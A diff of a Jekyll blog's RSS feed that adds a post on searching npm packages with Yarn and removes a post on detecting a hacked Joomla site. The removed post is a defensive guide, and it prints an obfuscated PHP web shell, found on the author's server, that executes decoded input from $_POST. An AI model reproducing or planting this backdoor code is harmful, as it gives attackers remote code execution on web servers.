@@ -6,9 +6,94 @@
 </description>
     <link>https://simpleit.rocks/</link>
     <atom:link href="https://simpleit.rocks/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Fri, 02 Jun 2017 22:24:28 +0000</pubDate>
-    <lastBuildDate>Fri, 02 Jun 2017 22:24:28 +0000</lastBuildDate>
+    <pubDate>Sat, 03 Jun 2017 21:17:05 +0000</pubDate>
+    <lastBuildDate>Sat, 03 Jun 2017 21:17:05 +0000</lastBuildDate>
     <generator>Jekyll v3.4.3</generator>
+    
+      <item>
+        <title>How To Search Packages Using Yarn</title>
+        <description>&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
+
+&lt;p&gt;How to have the &lt;em&gt;search&lt;/em&gt; functionailty like &lt;code class=&quot;highlighter-rouge&quot;&gt;npm search&lt;/code&gt; or &lt;code class=&quot;highlighter-rouge&quot;&gt;bower
+search&lt;/code&gt; in Yarn, or simply look for packages in a browser.&lt;/p&gt;
+
+&lt;h2 id=&quot;options&quot;&gt;Options&lt;/h2&gt;
+
+&lt;h3 id=&quot;cli-search&quot;&gt;CLI search&lt;/h3&gt;
+
+&lt;p&gt;Search yarn packages in command line using &lt;a href=&quot;https://github.com/npms-io/npms-cli&quot;&gt;npms-cli&lt;/a&gt;:&lt;/p&gt;
+
+&lt;p&gt;Install &lt;code class=&quot;highlighter-rouge&quot;&gt;npms-cli&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;yarn global add npms-cli
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;pre class=&quot;shell&quot;&gt;
+&lt;samp&gt;
+&lt;span class=&quot;shell-prompt&quot;&gt;$&lt;/span&gt; &lt;kbd&gt;yarn global add npms-cli&lt;/kbd&gt;
+yarn global v0.24.5
+[1/4] Resolving packages...
+[2/4] Fetching packages...
+[3/4] Linking dependencies...
+[4/4] Building fresh packages...
+success Installed &quot;npms-cli@1.6.0&quot; with binaries:
+      - npms
+Done in 14.05s.
+&lt;/samp&gt;
+&lt;/pre&gt;
+
+&lt;p&gt;Then you will have available &lt;code class=&quot;highlighter-rouge&quot;&gt;/usr/bin/npms&lt;/code&gt; and can search like:
+&lt;code class=&quot;highlighter-rouge&quot;&gt;npms search &amp;lt;desired package&amp;gt;&lt;/code&gt;, for example for the package &lt;code class=&quot;highlighter-rouge&quot;&gt;font-awesome&lt;/code&gt;:&lt;/p&gt;
+
+&lt;pre class=&quot;shell&quot;&gt;
+&lt;samp&gt;
+&lt;span class=&quot;shell-prompt&quot;&gt;$&lt;/span&gt; &lt;kbd&gt;npms search font-awesome&lt;/kbd&gt;
+┌─────────────────────────────────────────────────────────────────────────────┬─────────┬────────────┬─────────────┬───────┐
+│ Package                                                                     │ Quality │ Popularity │ Maintenance │ Score │
+├─────────────────────────────────────────────────────────────────────────────┼─────────┼────────────┼─────────────┼───────┤
+│ font-awesome • https://github.com/FortAwesome/Font-Awesome                  │         │            │             │       │
+│ The iconic font and CSS framework                                           │   83    │     71     │     38      │  63   │
+│ updated 7 months ago by juliankrispel                                       │         │            │             │       │
+├─────────────────────────────────────────────────────────────────────────────┼─────────┼────────────┼─────────────┼───────┤
+│ ember-font-awesome • https://github.com/martndemus/ember-font-awesome       │         │            │             │       │
+│ An ember-cli addon for using Font Awesome icons in Ember applications.      │   89    │     22     │     100     │  70   │
+│ updated 2 months ago by martndemus                                          │         │            │             │       │
+├─────────────────────────────────────────────────────────────────────────────┼─────────┼────────────┼─────────────┼───────┤
+│ font-awesome-filetypes • https://github.com/spatie/font-awesome-filetypes   │         │            │             │       │
+│ Helper to retrieve the Font Awesome icon for a specific file extension      │   95    │     9      │     100     │  67   │
+│ updated 2 years ago by sebastiandedeyne                                     │         │            │             │       │
+├─────────────────────────────────────────────────────────────────────────────┼─────────┼────────────┼─────────────┼───────┤
+....
+└─────────────────────────────────────────────────────────────────────────────┴─────────┴────────────┴─────────────┴───────┘
+&lt;/samp&gt;
+&lt;/pre&gt;
+
+&lt;h3 id=&quot;search-with-browser&quot;&gt;Search with browser&lt;/h3&gt;
+
+&lt;p&gt;You can also search them using &lt;code class=&quot;highlighter-rouge&quot;&gt;https://npms.io/search?q=&amp;lt;desired
+package&amp;gt;&lt;/code&gt;:&lt;/p&gt;
+
+&lt;form action=&quot;https://npms.io/search&quot; method=&quot;get&quot; target=&quot;_blank&quot;&gt;
+  &lt;div class=&quot;form-group&quot;&gt;
+    &lt;label for=&quot;packageSearch&quot;&gt;Package Search&lt;/label&gt;
+    &lt;input type=&quot;text&quot; class=&quot;form-control&quot; id=&quot;q&quot; aria-describedby=&quot;packageSearch&quot; placeholder=&quot;Enter package name&quot; name=&quot;q&quot; /&gt;
+  &lt;/div&gt;
+  &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Search&lt;/button&gt;
+&lt;/form&gt;
+</description>
+        <pubDate>Sat, 03 Jun 2017 00:00:00 +0000</pubDate>
+        <link>https://simpleit.rocks/how-to-search-packages-using-yarn/</link>
+        <guid isPermaLink="true">https://simpleit.rocks/how-to-search-packages-using-yarn/</guid>
+        
+        
+        <category>docs</category>
+        
+        <category>javascript</category>
+        
+        <category>yarn</category>
+        
+      </item>
     
       <item>
         <title>Multilingual Jekyll Without Plugins</title>
@@ -2413,182 +2498,6 @@ data shows that improving site speed also reduces operating costs.&lt;/p&gt;
         <category>web</category>
         
         <category>seo</category>
-        
-      </item>
-    
-      <item>
-        <title>Find Out If Your Joomla Site Has Been Hacked</title>
-        <description>&lt;h2 id=&quot;overview&quot;&gt;Overview&lt;/h2&gt;
-
-&lt;p&gt;Like every popular Content Management System, there is always going to
-be at risk of being attacked or hacked. This article explore some
-methods to try to detect the integrity of your website.&lt;/p&gt;
-
-&lt;p&gt;Monitor your site regularly.&lt;/p&gt;
-
-&lt;h2 id=&quot;check-web-server-logs&quot;&gt;Check web server logs&lt;/h2&gt;
-
-&lt;p&gt;Check primarily for brute force attacks and attempts to upload
-files. With Apache in Ubuntu that would tipically mean to analyze
-&lt;code class=&quot;highlighter-rouge&quot;&gt;/var/log/apache2/access.log&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/log/apache2/error.log&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;For example, there is someone playing around one of my Joomla websites
-trying to explode Wordpress vulnerabilities:&lt;/p&gt;
-
-&lt;pre class=&quot;shell&quot;&gt;
-&lt;samp&gt;
-&lt;span class=&quot;shell-prompt&quot;&gt;/var/log/apache2/$&lt;/span&gt; &lt;kbd&gt;grep POST access.log&lt;/kbd&gt;
-XXXXXXXX.com:80 193.XXX.XXX.XXX - - [26/Jan/2017:00:07:03 +0000] &quot;POST /wp-content/themes/method/lib/scripts/dl-skin.php HTTP/1.1&quot; 500 363 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0&quot;
-XXXXXXXX.com:80 193.XXX.XXX.XXX - - [26/Jan/2017:00:07:14 +0000] &quot;POST /wp-content/themes/modular/lib/scripts/dl-skin.php HTTP/1.1&quot; 500 363 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0&quot;
-XXXXXXXX.com:80 193.XXX.XXX.XXX - - [26/Jan/2017:00:07:25 +0000] &quot;POST /wp-content/themes/myriad/lib/scripts/dl-skin.php HTTP/1.1&quot; 500 363 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0&quot;
-XXXXXXXX.com:80 193.XXX.XXX.XXX - - [26/Jan/2017:00:07:56 +0000] &quot;POST /wp-content/themes/persuasion/lib/scripts/dl-skin.php HTTP/1.1&quot; 500 363 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0&quot;
-&lt;/samp&gt;
-&lt;/pre&gt;
-
-&lt;h2 id=&quot;detect-modified-php-files&quot;&gt;Detect modified PHP files&lt;/h2&gt;
-
-&lt;p&gt;You can look for PHP files that were modified recently, or after some
-date you are sure didn’t perform anything to the source code.&lt;/p&gt;
-
-&lt;p&gt;That would show new possibly uploaded scripts or modified files with
-injected code in them.&lt;/p&gt;
-
-&lt;h3 id=&quot;find-files-modified-recently&quot;&gt;Find files modified recently&lt;/h3&gt;
-
-&lt;p&gt;To find recently modified files: &lt;kbd&gt;find /path/to/dir -type f -mtime -7 -ls&lt;/kbd&gt;.
-The &lt;code class=&quot;highlighter-rouge&quot;&gt;-mtime&lt;/code&gt; parameter detects when file’s data was last modified
-&lt;em&gt;n&lt;/em&gt;24* hours ago, in that case we analyze the previous 7 days.&lt;/p&gt;
-
-&lt;pre class=&quot;shell&quot;&gt;
-&lt;samp&gt;
-&lt;span class=&quot;shell-prompt&quot;&gt;$&lt;/span&gt; &lt;kbd&gt;find . -type f -mtime -7 -ls&lt;/kbd&gt;
-&lt;/samp&gt;
-&lt;/pre&gt;
-
-&lt;h3 id=&quot;find-files-modified-after-a-specific-date&quot;&gt;Find files modified after a specific date&lt;/h3&gt;
-
-&lt;p&gt;List files in given directory modified after given date &lt;kbd&gt; find
-/path/to/dir -newermt &quot;yyyy-mm-dd&quot;&lt;/kbd&gt;.&lt;/p&gt;
-
-&lt;blockquote class=&quot;blockquote&quot;&gt;
-  &lt;p&gt;-newerXY reference
-              Compares the timestamp of the current file with reference.  The reference argument is normally the name  of  a  file
-              (and  one  of its timestamps is used for the comparison) but it may also be a string describing an absolute time.  X
-              and Y are placeholders for other letters, and these letters select which time belonging to how reference is used for
-              the comparison.&lt;/p&gt;
-
-  &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;          a   The access time of the file reference
-          B   The birth time of the file reference
-          c   The inode status change time of reference
-          m   The modification time of the file reference
-          t   reference is interpreted directly as a time
-&lt;/code&gt;&lt;/pre&gt;
-  &lt;/div&gt;
-
-  &lt;footer class=&quot;blockquote-footer&quot;&gt; &lt;cite&gt;Find man page&lt;/cite&gt;&lt;/footer&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;In this example we look for files modified with the current directory
-as the base directory and modified after “2016-12-01”.&lt;/p&gt;
-
-&lt;pre class=&quot;shell&quot;&gt;
-&lt;samp&gt;
-&lt;span class=&quot;shell-prompt&quot;&gt;$&lt;/span&gt; &lt;kbd&gt;find . -newermt &quot;2017-01-25&quot; -ls&lt;/kbd&gt;
-1089538    4 drwxr-xr-x   2 marcanuy www-data     4096 Jan 25 04:13 ./website/logs
-&lt;/samp&gt;
-&lt;/pre&gt;
-
-&lt;h3 id=&quot;finding-hacked-files-with-pattern-matching&quot;&gt;Finding hacked files with pattern matching&lt;/h3&gt;
-
-&lt;p&gt;Most of the time injected code will be obfuscated, making it harder to
-look for obvious patterns, but we can try some alternatives though.&lt;/p&gt;
-
-&lt;p&gt;This code would be tipically inserted as the first line of the PHP
-file, starting with a variable, so we can look for that pattern, first
-line starting with &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;?php $&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;grep -m 1 -r &lt;span class=&quot;s1&quot;&gt;'^&amp;lt;?php \$'&lt;/span&gt; .&amp;lt;/kbd&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Output:&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./website/components/com_users/views/profile/tmpl/default_params.php:&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$fields&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getFieldset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'params'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-./website/administrator/cache/com_ajax3j/9411v11.php:&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$coi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;115&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x73&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;101&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x72&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x74&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zioj&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;98&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;
-&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x73&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x65&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x36&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;52&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x5f&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x64&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;101&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;c&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x6f&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;101&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$jd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;115&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x74&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;114&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x5f&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;111&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x74&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$coi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$zioj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$jd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_POST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;t&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;chr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)])));&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;First line of the output looks fine, but the second line looks a bit
-more than suspicious code, we can decode it and understand what it is
-doing before removing it.&lt;/p&gt;
-
-&lt;h2 id=&quot;files-with-wrong-permissions&quot;&gt;Files with wrong permissions&lt;/h2&gt;
-
-&lt;p&gt;Check out for writable upload directories. The &lt;code class=&quot;highlighter-rouge&quot;&gt;find&lt;/code&gt; command can be used to scan for files and folder with
-permission 777.&lt;/p&gt;
-
-&lt;pre class=&quot;shell&quot;&gt;
-&lt;span class=&quot;shell-prompt&quot;&gt;$&lt;/span&gt; &lt;kbd&gt;find . -type f,d -perm 0777 -print &lt;/kbd&gt;
-&lt;/pre&gt;
-
-&lt;blockquote class=&quot;blockquote&quot;&gt;
-  &lt;p&gt;-perm mode
-              File’s  permission  bits  are  exactly  mode (octal or sym‐
-              bolic).  Since an exact match is required, if you  want  to
-              use this form for symbolic modes, you may have to specify a
-              rather complex mode string.  For example -perm  g=w  will
-              only  match  files  which have mode 0020 (that is, ones for
-              which group write permission is the only  permission  set).
-              It  is more likely that you will want to use the / or -
-              forms, for example -perm -g=w,  which  matches  any  file
-              with  group write permission.  See the EXAMPLES section for
-              some illustrative examples.&lt;/p&gt;
-
-  &lt;footer class=&quot;blockquote-footer&quot;&gt; &lt;cite&gt;Find man page&lt;/cite&gt;&lt;/footer&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Also we can choose many file types at once separating them with ‘,’
-like &lt;code class=&quot;highlighter-rouge&quot;&gt;-type=d,f&lt;/code&gt; where &lt;code class=&quot;highlighter-rouge&quot;&gt;d&lt;/code&gt; stands for &lt;em&gt;directory&lt;/em&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;f&lt;/code&gt; for &lt;em&gt;files&lt;/em&gt;.&lt;/p&gt;
-
-&lt;p&gt;Then we can modify it a bit to scan through all the 777 files on the
-server and show ones with &lt;code class=&quot;highlighter-rouge&quot;&gt;.php&lt;/code&gt; to look for uploaded scripts:&lt;/p&gt;
-
-&lt;pre class=&quot;shell&quot;&gt;
-&lt;span class=&quot;shell-prompt&quot;&gt;$&lt;/span&gt; &lt;kbd&gt;find . -name &quot;*php&quot; -type f -perm 777&lt;/kbd&gt;
-&lt;/pre&gt;
-
-&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
-
-&lt;p&gt;A lot of people recommends to install a clean backup after being
-hacked, this approach will fail sooner or later because you need to
-know what failed to prevent happening again.&lt;/p&gt;
-
-&lt;p&gt;This article covers some basic strategies for identifying compromised
-files, attacks are constant with varying methods so it is important to
-know commands and strategies to recover our sites and keep them safe.&lt;/p&gt;
-
-&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;http://www.gregfreeman.io/2013/how-to-tell-if-your-php-site-has-been-compromised/&quot;&gt;http://www.gregfreeman.io/2013/how-to-tell-if-your-php-site-has-been-compromised/&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.bluebridgedev.com/hacked-joomla-files&quot;&gt;https://www.bluebridgedev.com/hacked-joomla-files&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.joomshaper.com/blog/my-joomla-site-was-hacked-what-to-do&quot;&gt;https://www.joomshaper.com/blog/my-joomla-site-was-hacked-what-to-do&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.google.com/transparencyreport/safebrowsing/diagnostic/index.html&quot;&gt;https://www.google.com/transparencyreport/safebrowsing/diagnostic/index.html&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;The Joomla Hacking Compendium &lt;a href=&quot;https://www.exploit-db.com/papers/15780/&quot;&gt;https://www.exploit-db.com/papers/15780/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-</description>
-        <pubDate>Thu, 26 Jan 2017 00:00:00 +0000</pubDate>
-        <link>https://simpleit.rocks/find-out-if-your-joomla-site-has-been-hacked/</link>
-        <guid isPermaLink="true">https://simpleit.rocks/find-out-if-your-joomla-site-has-been-hacked/</guid>
-        
-        
-        <category>docs</category>
-        
-        <category>php</category>
-        
-        <category>joomla</category>
         
       </item>
     
